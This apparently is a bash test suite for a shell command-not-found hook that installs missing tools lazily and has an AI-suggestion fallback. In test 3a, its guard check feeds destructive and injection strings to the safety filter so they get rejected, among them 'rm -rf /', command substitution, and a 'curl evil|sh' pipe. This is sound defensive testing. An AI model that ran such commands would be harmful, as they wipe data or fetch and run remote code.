#!/usr/bin/env bash
# Test the command-not-found AI lazy-installer (home/dot_config/shell/not-found-hook.sh + home/dot_local/bin/executable_cnf-build-index).
# Hermetic + SAFE: exercises __cnf_resolve in CNF_DRY mode against a synthetic
# index (no real install, no machine mutation) and validates the index builder.
# Mirrors handler.sh's gum-or-printf output idiom so it runs in CI without gum.
# Part of the "aid" first-workflow slice — see docs/aid/CURRENT-STATE.md.
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# Single canonical (chezmoi-deployed) locations — fire #3 folded provisioning/command-not-found/ here.
HANDLER="$ROOT/home/dot_config/shell/not-found-hook.sh"       # → ~/.config/shell/not-found-hook.sh
BUILDER="$ROOT/home/dot_local/bin/executable_cnf-build-index" # → ~/.local/bin/cnf-build-index

say(){  command -v gum >/dev/null 2>&1 && gum style --foreground 51  -- "$*" || printf '\033[1;36m%s\033[0m\n' "$*"; }
pass(){ command -v gum >/dev/null 2>&1 && gum style --foreground 46  -- "PASS $*" || printf '\033[1;32mPASS\033[0m %s\n' "$*"; PASS=$((PASS+1)); }
fail(){ command -v gum >/dev/null 2>&1 && gum style --foreground 196 -- "FAIL $*" || printf '\033[1;31mFAIL\033[0m %s\n' "$*"; FAIL=$((FAIL+1)); }
skip(){ command -v gum >/dev/null 2>&1 && gum style --foreground 214 -- "SKIP $*" || printf '\033[1;33mSKIP\033[0m %s\n' "$*"; }
PASS=0; FAIL=0

say "command-not-found test suite"

# 0. static syntax
bash -n "$HANDLER" && pass "not-found-hook.sh parses" || fail "not-found-hook.sh syntax error"
bash -n "$BUILDER" && pass "cnf-build-index parses" || fail "cnf-build-index syntax error"

# E10 (v2): the hook must NEVER eval model-generated text or replay a shell string. Grep CODE lines
# only (strip comments, which legitimately mention the word).
if grep -vE '^[[:space:]]*#' "$HANDLER" | grep -qE '\beval\b'; then fail "E10: 'eval' on a code line — model-text eval must be eliminated"; else pass "E10: no eval of model-generated commands in the hook"; fi

# shellcheck source=/dev/null
. "$HANDLER"
# isolate the test shell from the handler's shell hooks — a missing/typo'd function in this
# harness must NOT trigger the real resolver (which would try to install something).
unset -f command_not_found_handler command_not_found_handle 2>/dev/null || true

# the rc entry point must exist (dot_zshrc/dot_bashrc source this file then call it)
if declare -F handle_command_not_found >/dev/null 2>&1; then pass "handle_command_not_found (rc entry point) defined"; else fail "handle_command_not_found missing — rc integration would break"; fi

# 1. dry-run resolve against a synthetic index (proves lookup + manager selection; NO install)
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
idx="$tmp/index.tsv"
# pick a package manager that actually exists on this runner; capture its TSV column.
# columns: 1 bin 2 key 3 brew 4 apt 5 dnf 6 pacman 7 cask 8 choco 9 scoop 10 go 11 cargo 12 npm 13 pipx 14 pip 15 gem
mgr=""; col=0
for cand in "brew:3" "go:10" "cargo:11" "npm:12" "pip:14" "gem:15"; do
  name="${cand%%:*}"; c="${cand##*:}"
  if command -v "$name" >/dev/null 2>&1; then mgr="$name"; col="$c"; break; fi
done
if [ -n "$mgr" ]; then
  row=(testtool testtool "" "" "" "" "" "" "" "" "" "" "" "" "")  # 15 fields, all installers empty
  row[$((col-1))]="testtool-pkg"                                   # fill only the detected manager's column
  ( IFS=$'\t'; printf '%s\n' "${row[*]}" ) > "$idx"
  out="$(CNF_INDEX="$idx" CNF_DRY=1 __cnf_resolve testtool 2>&1)"; rc=$?
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "\[CNF_DRY\] would install via $mgr: testtool-pkg"; then
    pass "dry-run resolves testtool -> $mgr: testtool-pkg (no install performed)"
  else
    fail "dry-run resolve (rc=$rc) :: $out"
  fi
else
  skip "no supported package manager on runner — dry-run resolve skipped"
fi

# 2. index builder end-to-end (needs yq+jq OR python3+pyyaml)
SW="$ROOT/software.yml"
built="$tmp/built.tsv"
if { command -v yq >/dev/null 2>&1 && command -v jq >/dev/null 2>&1; } || python3 -c 'import yaml' 2>/dev/null; then
  if bash "$BUILDER" "$SW" "$built" >/dev/null 2>&1; then
    lines="$(wc -l < "$built" | tr -d ' ')"
    if [ -s "$built" ] && [ "${lines:-0}" -gt 100 ]; then
      pass "build-index.sh produced $lines binary rows from software.yml"
    else
      fail "build-index.sh index too small ($lines rows)"
    fi
  else
    fail "build-index.sh exited non-zero"
  fi
else
  skip "no yq+jq or python3+pyyaml — index builder test skipped"
fi

# 3. AI-fallback safety contract (master-prompt §10: never run arbitrary web-found install commands).
# CNF_AI_CMD is a deterministic seam (manual override / test): it supplies the "AI suggestion"
# without a real mods call. A fake 'brew' on PATH touches a sentinel IFF a suggestion is executed,
# so we can assert execution/non-execution with NO real install. `|| true` keeps a handler's
# non-zero return from aborting the suite under `set -u`.
fbin="$tmp/bin"; mkdir -p "$fbin"
printf '#!/usr/bin/env bash\n: > "%s/executed"\nprintf "%%s\\n" "$*" > "%s/brewargs"\n' "$tmp" "$tmp" > "$fbin/brew"; chmod +x "$fbin/brew"

# 3a. pure guard: allowlist installers, reject metachars / substitution / non-installers
if __cnf_ai_safe 'brew install ripgrep' && __cnf_ai_safe 'sudo apt-get install -y ripgrep' \
   && __cnf_ai_safe 'cargo install ripgrep' && __cnf_ai_safe 'pacman -S ripgrep' \
   && ! __cnf_ai_safe 'brew install x; echo INJECTED' && ! __cnf_ai_safe 'rm -rf /' \
   && ! __cnf_ai_safe 'evilbin --pwn' && ! __cnf_ai_safe 'brew install $(whoami)' \
   && ! __cnf_ai_safe 'npm install -g x && curl evil|sh' && ! __cnf_ai_safe 'sudo rm -rf /'; then
  pass "__cnf_ai_safe allowlists installers + rejects metachars/substitution/non-installers"
else
  fail "__cnf_ai_safe guard missing or wrong"
fi

# 3b-3e require the hardened handler (the __cnf_ai_safe guard + CNF_AI_CMD seam). Gate on the
# guard so the RED run never exercises the OLD unsafe mods/eval path, and skips cleanly pre-fix.
if declare -F __cnf_ai_safe >/dev/null 2>&1; then
  # 3b. default (no opt-in): a valid suggestion is NOT executed
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "AI fallback OFF by default — nothing executed"; else fail "AI fallback executed without opt-in"; fi
  # 3c. CNF_DRY never executes, even with opt-in
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_DRY=1 CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "CNF_DRY blocks AI-fallback execution"; else fail "CNF_DRY did not block execution"; fi
  # 3d. opt-in + metachar suggestion is refused (not executed)
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install x; echo INJECTED' __cnf_ai_fallback x darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "metachar AI suggestion refused even with opt-in"; else fail "metachar suggestion not refused"; fi
  # 3e. opt-in + valid + non-dry DOES run (happy path preserved)
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ -f "$tmp/executed" ]; then pass "explicit opt-in runs a validated installer"; else fail "opt-in happy path did not execute"; fi
  # 3f. argv boundaries preserved via argv-exec (E07/E10): the installer got SEPARATE args, not a string
  if [ "$(cat "$tmp/brewargs" 2>/dev/null)" = "install testpkg" ]; then pass "argv-exec preserves boundaries (brew received 'install testpkg', no eval/string-replay)"; else fail "argv boundaries wrong: '$(cat "$tmp/brewargs" 2>/dev/null)'"; fi
else
  skip "AI-fallback behavior (3b-3e) — handler not hardened yet (__cnf_ai_safe absent)"
fi

# 4. provision wiring: a chezmoi run_after script (re)builds the index via the deployed builder on
# every `chezmoi apply` (apply is how software.yml changes reach a box). CNF_BUILD_INDEX_BIN is the
# test/override seam. Fake builder touches a sentinel so we can assert it was invoked (no real build).
WIRING="$ROOT/home/.chezmoiscripts/universal/run_after_22-cnf-index.sh.tmpl"
if [ -f "$WIRING" ]; then
  bash -n "$WIRING" && pass "run_after cnf-index wiring parses" || fail "run_after cnf-index syntax error"
  rm -f "$tmp/built-by-wiring"
  printf '#!/usr/bin/env bash\n: > "%s/built-by-wiring"\n' "$tmp" > "$fbin/fake-cnf-build-index"; chmod +x "$fbin/fake-cnf-build-index"
  CNF_BUILD_INDEX_BIN="$fbin/fake-cnf-build-index" bash "$WIRING" >/dev/null 2>&1 || true
  if [ -f "$tmp/built-by-wiring" ]; then pass "run_after wiring invokes the index builder"; else fail "run_after wiring did not invoke the builder"; fi
else
  fail "provision wiring script missing: home/.chezmoiscripts/universal/run_after_22-cnf-index.sh.tmpl"
fi

# 5. E11 recursion guard — a re-entry for the SAME cmd returns 127 without resolving (no infinite loop)
out5="$(__CNF_RESOLVING='reentrant' CNF_INDEX=/dev/null __cnf_resolve reentrant 2>&1)"; rc5=$?
[ "$rc5" -eq 127 ] && pass "E11 recursion guard — same-cmd re-entry -> 127 (no loop, no resolve)" || fail "recursion guard rc=$rc5 :: $out5"

# 6. E11 concurrency — two shells missing the SAME tool produce EXACTLY ONE install (lockdir serialized).
# Fake brew counts installs, sleeps so the peer overlaps, then creates 'footool' on PATH so the peer
# (and the race-after-release path) detect it and skip. Hermetic: tmp PATH + tmp index + tmp lock dir.
cbin="$tmp/cbin"; mkdir -p "$cbin"
fooidx="$tmp/fooidx.tsv"; printf 'footool\tfootool\tfootool\n' > "$fooidx"
printf '#!/usr/bin/env bash\necho 1 >> "%s/installcount"\nsleep 2\nprintf "#!/usr/bin/env bash\\necho ran\\n" > "%s/footool"\nchmod +x "%s/footool"\n' "$tmp" "$cbin" "$cbin" > "$cbin/brew"; chmod +x "$cbin/brew"
rm -f "$tmp/installcount" "$cbin/footool"
# CNF_ALLOW_NONINTERACTIVE=1 — these subshells are non-interactive (E13); simulate an APPROVED install.
( PATH="$cbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$fooidx" CNF_LOCK_DIR="$tmp/locks" __cnf_resolve footool >/dev/null 2>&1 ) &
( PATH="$cbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$fooidx" CNF_LOCK_DIR="$tmp/locks" __cnf_resolve footool >/dev/null 2>&1 ) &
wait
ic="$(grep -c . "$tmp/installcount" 2>/dev/null || echo 0)"
[ "$ic" = "1" ] && pass "E11 concurrency — 2 shells missing footool -> exactly ONE install (lock serialized)" || fail "E11 concurrency installs=$ic (want 1)"

# 7. E09/E08 — installer progress + hook status go to STDERR; a resolved command's STDOUT stays CLEAN.
# Fake brew prints noise to STDOUT then installs 'cleantool' (which echoes a sentinel). Capturing the
# resolve's stdout (2>/dev/null) must yield ONLY the sentinel — no install chatter.
ebin="$tmp/ebin"; mkdir -p "$ebin"
e9idx="$tmp/e9idx.tsv"; printf 'cleantool\tcleantool\tcleantool\n' > "$e9idx"
printf '#!/usr/bin/env bash\necho BREW_STDOUT_NOISE\nprintf "#!/usr/bin/env bash\\necho CLEAN_OUTPUT_42\\n" > "%s/cleantool"\nchmod +x "%s/cleantool"\n' "$ebin" "$ebin" > "$ebin/brew"; chmod +x "$ebin/brew"
rm -f "$ebin/cleantool"
e9out="$(PATH="$ebin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$e9idx" CNF_LOCK_DIR="$tmp/e9locks" __cnf_resolve cleantool 2>/dev/null)"
[ "$e9out" = "CLEAN_OUTPUT_42" ] && pass "E09/E08 — resolved command stdout is CLEAN (installer+hook noise on stderr)" || fail "E09 stdout polluted: '$e9out'"

# 8. E13/E14 — a NON-INTERACTIVE shell (CI/script/background/untrusted-project command) must NOT
# auto-install on a miss without an explicit opt-in: it returns ordinary not-found (127) and touches
# NO installer. The test shell is non-interactive, so a bare resolve (no opt-in, no CNF_DRY) must not
# run the fake brew. Then the SAME miss WITH CNF_ALLOW_NONINTERACTIVE=1 (aid exec/prewarm) DOES install.
nbin="$tmp/nbin"; mkdir -p "$nbin"
n8idx="$tmp/n8idx.tsv"; printf 'noauto\tnoauto\tnoauto\n' > "$n8idx"
printf '#!/usr/bin/env bash\n: > "%s/n8installed"\n' "$tmp" > "$nbin/brew"; chmod +x "$nbin/brew"
rm -f "$tmp/n8installed" "$nbin/noauto"
n8out="$(PATH="$nbin:$PATH" CNF_INDEX="$n8idx" CNF_LOCK_DIR="$tmp/n8locks" __cnf_resolve noauto 2>/dev/null)"; n8rc=$?
if [ "$n8rc" -eq 127 ] && [ ! -f "$tmp/n8installed" ]; then
  pass "E13/E14 — non-interactive miss w/o opt-in -> 127, no install (unauthorized install blocked)"
else
  fail "E13 non-interactive guard rc=$n8rc installed=$([ -f "$tmp/n8installed" ] && echo yes || echo no)"
fi
# 8b. the SAME miss WITH the explicit opt-in installs (approved aid exec / prewarming path).
rm -f "$tmp/n8installed"
printf '#!/usr/bin/env bash\n: > "%s/n8installed"\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/noauto"\nchmod +x "%s/noauto"\n' "$tmp" "$nbin" "$nbin" > "$nbin/brew"; chmod +x "$nbin/brew"
CNF_ALLOW_NONINTERACTIVE=1 PATH="$nbin:$PATH" CNF_INDEX="$n8idx" CNF_LOCK_DIR="$tmp/n8locks2" __cnf_resolve noauto >/dev/null 2>&1 || true
[ -f "$tmp/n8installed" ] && pass "E13 — CNF_ALLOW_NONINTERACTIVE opt-in permits install (aid exec/prewarm)" || fail "E13 opt-in did not permit install"

# 9. D13/B07 — the index build is ATOMIC + fail-soft: a FAILED/empty rebuild must NOT clobber a good
# index. Write a 3-row "good" index, then rebuild from a BROKEN source into the SAME path; the good
# index must survive intact. The old direct `> $OUT` write truncates it to 0 bytes before the parser
# even runs (RED); the temp-file + atomic-rename build leaves the previous good index untouched (GREEN).
atmp="$tmp/atomic"; mkdir -p "$atmp"
goodidx="$atmp/index.tsv"
printf 'a\ta\ta\nb\tb\tb\nc\tc\tc\n' > "$goodidx"
before="$(wc -l < "$goodidx" | tr -d ' ')"
badsrc="$atmp/broken.yml"; printf 'softwarePackages:\n  foo: {unclosed flow\n' > "$badsrc"
bash "$BUILDER" "$badsrc" "$goodidx" >/dev/null 2>&1 || true   # expected to fail (parse error OR 0-row guard)
after="$(wc -l < "$goodidx" 2>/dev/null | tr -d ' ')"
{ [ "$after" = "$before" ] && [ -s "$goodidx" ]; } && pass "D13/B07 — failed rebuild preserves the good index (atomic temp+rename, fail-soft: $before rows intact)" || fail "D13 non-atomic: index clobbered by failed build (before=$before after=$after)"

# 10. E04 primitive — CNF_NO_EXEC INSTALLS but does NOT re-run the command (the install-only mode the
# fish adapter delegates to; bash can't re-run into fish). Fake brew installs 'nxtool'; nxtool, IF RUN,
# would touch a sentinel — under CNF_NO_EXEC it must NOT be executed, yet the resolver returns 0 because
# the binary is now present. (RED on the old code, which always exec'd the installed command.)
nxbin="$tmp/nxbin"; mkdir -p "$nxbin"
nxidx="$tmp/nxidx.tsv"; printf 'nxtool\tnxtool\tnxtool\n' > "$nxidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\n: > \\"%s/nxran\\"\\n" > "%s/nxtool"\nchmod +x "%s/nxtool"\n' "$tmp" "$nxbin" "$nxbin" > "$nxbin/brew"; chmod +x "$nxbin/brew"
rm -f "$nxbin/nxtool" "$tmp/nxran"
CNF_NO_EXEC=1 CNF_ALLOW_NONINTERACTIVE=1 PATH="$nxbin:$PATH" CNF_INDEX="$nxidx" CNF_LOCK_DIR="$tmp/nxlocks" __cnf_resolve nxtool >/dev/null 2>&1; nxrc=$?
{ [ "$nxrc" -eq 0 ] && [ -x "$nxbin/nxtool" ] && [ ! -f "$tmp/nxran" ]; } && pass "E04 primitive — CNF_NO_EXEC installs but does NOT re-run (rc=0, binary present, never executed)" || fail "CNF_NO_EXEC rc=$nxrc installed=$([ -x "$nxbin/nxtool" ] && echo y || echo n) ran=$([ -f "$tmp/nxran" ] && echo y || echo n)"

# 11. E02 (ADR 0003) — DEFER to mise for a mise-provided command (don't duplicate mise's lazy machinery
# with a redundant system install). Fake `mise`: `mise which mtool` succeeds; `mise exec -- mtool` runs a
# sentinel + exits 7. mtool is ALSO in the index, so a fake `brew` would install it IF the hook fell
# through — it must NOT: the resolve runs via mise (sentinel + status 7) and never invokes brew.
mbin="$tmp/mbin"; mkdir -p "$mbin"
midx="$tmp/midx.tsv"; printf 'mtool\tmtool\tmtool\n' > "$midx"
printf '#!/usr/bin/env bash\ncase "$1" in\n  which) [ "$2" = mtool ] && exit 0 || exit 1;;\n  exec) shift; [ "$1" = -- ] && shift; if [ "$1" = mtool ]; then echo MISE_RAN_MTOOL; exit 7; fi;;\nesac\nexit 1\n' > "$mbin/mise"; chmod +x "$mbin/mise"
printf '#!/usr/bin/env bash\n: > "%s/brew_ran"\n' "$tmp" > "$mbin/brew"; chmod +x "$mbin/brew"
rm -f "$tmp/brew_ran"
mout="$(CNF_ALLOW_NONINTERACTIVE=1 PATH="$mbin:$PATH" CNF_INDEX="$midx" CNF_LOCK_DIR="$tmp/mlocks" __cnf_resolve mtool 2>/dev/null)"; mrc=$?
{ [ "$mout" = "MISE_RAN_MTOOL" ] && [ "$mrc" -eq 7 ] && [ ! -f "$tmp/brew_ran" ]; } && pass "E02 — mise-provided command runs via mise (status preserved), brew never invoked (no duplicate install)" || fail "E02 mise defer: out='$mout' rc=$mrc brew_ran=$([ -f "$tmp/brew_ran" ] && echo y || echo n)"
# 11b. a command mise does NOT provide falls through to the normal install path (fake brew installs it).
rm -f "$tmp/brew_ran" "$mbin/othertool"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho OTHER_OK\\n" > "%s/othertool"\nchmod +x "%s/othertool"\n: > "%s/brew_ran"\n' "$mbin" "$mbin" "$tmp" > "$mbin/brew"; chmod +x "$mbin/brew"
oidx="$tmp/oidx.tsv"; printf 'othertool\tothertool\tothertool\n' > "$oidx"
oout="$(CNF_ALLOW_NONINTERACTIVE=1 PATH="$mbin:$PATH" CNF_INDEX="$oidx" CNF_LOCK_DIR="$tmp/mlocks2" __cnf_resolve othertool 2>/dev/null)"
{ [ "$oout" = "OTHER_OK" ] && [ -f "$tmp/brew_ran" ]; } && pass "E02 — a non-mise command falls through to the normal install path (brew)" || fail "E02 fallthrough: out='$oout' brew_ran=$([ -f "$tmp/brew_ran" ] && echo y || echo n)"

# 12. U09/U10 — lazy-install TELEMETRY: a successful install appends a well-formed NDJSON line to the
# LOCAL journal (cmd/manager/pkg/outcome/duration_ms). No secrets, append-only. jq-validated.
jbin="$tmp/jbin"; mkdir -p "$jbin"
jidx="$tmp/jidx.tsv"; printf 'jtool\tjtool\tjtool\n' > "$jidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/jtool"\nchmod +x "%s/jtool"\n' "$jbin" "$jbin" > "$jbin/brew"; chmod +x "$jbin/brew"
jlog="$tmp/installs.ndjson"; rm -f "$jlog" "$jbin/jtool"
CNF_JOURNAL="$jlog" CNF_ALLOW_NONINTERACTIVE=1 PATH="$jbin:$PATH" CNF_INDEX="$jidx" CNF_LOCK_DIR="$tmp/jlocks" __cnf_resolve jtool >/dev/null 2>&1
if [ -s "$jlog" ] && command -v jq >/dev/null 2>&1; then
  tail -1 "$jlog" | jq -e '.cmd=="jtool" and .mgr=="brew" and .pkg=="jtool" and .outcome=="installed" and (.duration_ms|type=="number")' >/dev/null 2>&1 && pass "U09/U10 — install appends a well-formed telemetry line (cmd/mgr/pkg/outcome/duration_ms)" || fail "journal line malformed: $(tail -1 "$jlog")"
elif [ -s "$jlog" ]; then
  { grep -q '"outcome":"installed"' "$jlog" && grep -q '"cmd":"jtool"' "$jlog"; } && pass "U09/U10 — install appends a telemetry line (jq absent; grep-validated)" || fail "journal line: $(tail -1 "$jlog")"
else
  fail "U09/U10 journal not written to $jlog"
fi
# 12b. V01 — sourcing the hook writes NO journal (telemetry is install-time only; startup stays
# side-effect + network free). A fresh journal path must stay absent after a bare source.
jlog2="$tmp/startup.ndjson"; rm -f "$jlog2"
( CNF_JOURNAL="$jlog2"; . "$HANDLER" ) >/dev/null 2>&1
[ ! -f "$jlog2" ] && pass "V01 — sourcing the hook writes no journal (startup side-effect-free)" || fail "sourcing wrote a journal: $(cat "$jlog2" 2>/dev/null)"

# 13. D03/E07 — array installer values install as SEPARATE args. software.yml allows a manager to take an
# ARRAY of packages (docker.apt = [containerd.io, docker-ce, docker-ce-cli, docker-compose-plugin]); the
# index space-JOINS them into one column. __cnf_do_install must word-split that back into N argv, not pass
# one quoted "a b c" (which apt/brew try to install as a single, unfindable package → the 61 array entries'
# lazy-install broken). Fake brew records each arg on its OWN line so we count SEPARATE args, not $* (which
# joins + hides the bug). RED on the old quoted-"$pkg"; GREEN once split to argv.
mabin="$tmp/mabin"; mkdir -p "$mabin"
maidx="$tmp/maidx.tsv"; printf 'multitool\tmultitool\tpkg-a pkg-b pkg-c\n' > "$maidx"   # brew col = 3 space-joined pkgs
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$@" > "%s/margs"\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/multitool"\nchmod +x "%s/multitool"\n' "$tmp" "$mabin" "$mabin" > "$mabin/brew"; chmod +x "$mabin/brew"
rm -f "$mabin/multitool" "$tmp/margs"
CNF_ALLOW_NONINTERACTIVE=1 PATH="$mabin:$PATH" CNF_INDEX="$maidx" CNF_LOCK_DIR="$tmp/malocks" __cnf_resolve multitool >/dev/null 2>&1 || true
if [ "$(wc -l < "$tmp/margs" 2>/dev/null | tr -d ' ')" = 4 ] && [ "$(sed -n 2p "$tmp/margs" 2>/dev/null)" = "pkg-a" ] && [ "$(sed -n 4p "$tmp/margs" 2>/dev/null)" = "pkg-c" ]; then
  pass "D03/E07 — array installer value installs as SEPARATE args (brew got 'install pkg-a pkg-b pkg-c', not one joined package; #163)"
else
  fail "array pkg serialization: brew args=[$(tr '\n' ',' < "$tmp/margs" 2>/dev/null)] (want install,pkg-a,pkg-b,pkg-c as 4 lines)"
fi

# 14. F02/D06 — CASK DETECTION: a cask-ONLY app (cask column set, brew column empty — 253 such GUI apps:
# aerospace/alt-tab/android-studio/…) must install via `brew install --cask`. There is NO standalone `cask`
# binary, so the manager-availability check must test `brew` (not `command -v cask`, which always fails →
# the cask branch is never selected → every cask-only app silently un-lazy-installable). __cnf_os forced to
# darwin (in a subshell) so the pref tries cask first on ANY runner; fake brew records args + creates the tool.
ckbin="$tmp/ckbin"; mkdir -p "$ckbin"
ckidx="$tmp/ckidx.tsv"
printf 'casktool\tcasktool\t\t\t\t\tcasktool-app\n' > "$ckidx"   # col 7 (cask)=casktool-app; brew (col3) EMPTY
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$@" > "%s/ckargs"\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/casktool"\nchmod +x "%s/casktool"\n' "$tmp" "$ckbin" "$ckbin" > "$ckbin/brew"; chmod +x "$ckbin/brew"
rm -f "$ckbin/casktool" "$tmp/ckargs"
( __cnf_os(){ echo darwin; }; CNF_ALLOW_NONINTERACTIVE=1 PATH="$ckbin:$PATH" CNF_INDEX="$ckidx" CNF_LOCK_DIR="$tmp/cklocks" __cnf_resolve casktool ) >/dev/null 2>&1 || true
if grep -qx -- '--cask' "$tmp/ckargs" 2>/dev/null && grep -qx 'casktool-app' "$tmp/ckargs" 2>/dev/null; then
  pass "F02/D06 — cask-only app installs via 'brew install --cask' (manager check uses brew, not the nonexistent 'cask' binary; #164)"
else
  fail "cask detection: brew args=[$(tr '\n' ',' < "$tmp/ckargs" 2>/dev/null)] (want install,--cask,casktool-app)"
fi

# 15. E08/E15 — STREAM + EXIT-STATUS fidelity (the transparent-shim property; §5 golden path
# "executes once with preserved argv/streams/status"). argv (#163 + boundaries) + stdout (#7) are
# already covered; this adds the two gaps a real pipeline/script depends on:
#   (a) the piped STDIN reaches the RESOLVED command — the install is `</dev/null` so it can't eat
#       the command's stdin, but the resolved command must still RECEIVE it (line 227 `"$cmd" "$@"`
#       inherits the shell's stdin, not the install's /dev/null);
#   (b) the resolved command's EXIT STATUS propagates as the handler's return code (line 227 `rc=$?`
#       → 229 `return "$rc"`), so `if missingtool; then` and `missingtool; echo $?` behave correctly.
# (a) stdin passthrough — fake brew installs 'stintool' = cat; piping DATA in must echo DATA back.
sibin="$tmp/sibin"; mkdir -p "$sibin"
siidx="$tmp/siidx.tsv"; printf 'stintool\tstintool\tstintool\n' > "$siidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\ncat\\n" > "%s/stintool"\nchmod +x "%s/stintool"\n' "$sibin" "$sibin" > "$sibin/brew"; chmod +x "$sibin/brew"
rm -f "$sibin/stintool"
siout="$(printf 'STDIN_PASSTHRU_77' | PATH="$sibin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$siidx" CNF_LOCK_DIR="$tmp/silocks" __cnf_resolve stintool 2>/dev/null)"
[ "$siout" = "STDIN_PASSTHRU_77" ] && pass "E08/E15 — piped STDIN reaches the resolved command (install </dev/null doesn't eat it)" || fail "stdin passthrough broken: got '$siout' (want STDIN_PASSTHRU_77)"
# (b) exit-status — fake brew installs 'rctool' that exits 42; the handler must return 42.
rcbin="$tmp/rcbin"; mkdir -p "$rcbin"
rcidx="$tmp/rcidx.tsv"; printf 'rctool\trctool\trctool\n' > "$rcidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\nexit 42\\n" > "%s/rctool"\nchmod +x "%s/rctool"\n' "$rcbin" "$rcbin" > "$rcbin/brew"; chmod +x "$rcbin/brew"
rm -f "$rcbin/rctool"
PATH="$rcbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$rcidx" CNF_LOCK_DIR="$tmp/rclocks" __cnf_resolve rctool >/dev/null 2>&1; rcrc=$?
[ "$rcrc" = 42 ] && pass "E08 — resolved command's EXIT STATUS propagates (rctool exit 42 → handler rc 42)" || fail "exit-status not preserved: handler rc=$rcrc (want 42)"

# 16. E07 — the hook MUST NOT persistently mutate the parent (interactive) shell. Every working var in
# __cnf_resolve/__cnf_do_install is `local`; a single dropped `local` would leak into the user's shell on
# EVERY missing command (e.g. clobber their $rest/$row/$col). Run the resolve IN THE CURRENT shell (a
# subshell would hide a leak), CNF_NO_EXEC so it installs-but-doesn't-run, then assert the hook-only
# internals are unset afterward. The checked names are used by the hook but NOT by this test
# (lock/acq/pref/row/mbin/rest/__t0/__dur/tok) so a pre-existing test global can't mask a real leak.
# Non-vacuity proven: dropping `lock acq` from the line-163 `local` makes them leak → this FAILs.
lkbin="$tmp/lkbin"; mkdir -p "$lkbin"
lkidx="$tmp/lkidx.tsv"; printf 'leaktool\tleaktool\tleaktool\n' > "$lkidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/leaktool"\nchmod +x "%s/leaktool"\n' "$lkbin" "$lkbin" > "$lkbin/brew"; chmod +x "$lkbin/brew"
rm -f "$lkbin/leaktool"
unset lock acq pref row mbin rest __t0 __dur tok 2>/dev/null || true
CNF_NO_EXEC=1 CNF_ALLOW_NONINTERACTIVE=1 CNF_JOURNAL="$tmp/lkjournal" PATH="$lkbin:$PATH" CNF_INDEX="$lkidx" CNF_LOCK_DIR="$tmp/lklocks" __cnf_resolve leaktool >/dev/null 2>&1
leaked=""
for v in lock acq pref row mbin rest __t0 __dur tok; do
  eval "__lk=\${$v+SET}"
  [ "${__lk:-}" = SET ] && leaked="$leaked $v"
done
[ -z "$leaked" ] && pass "E07 — hook leaks no internals into the parent shell (all __cnf_resolve/__cnf_do_install vars are local)" || fail "parent-env leak: hook left [$leaked ] set in the caller's shell (a dropped 'local')"

say "command-not-found: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
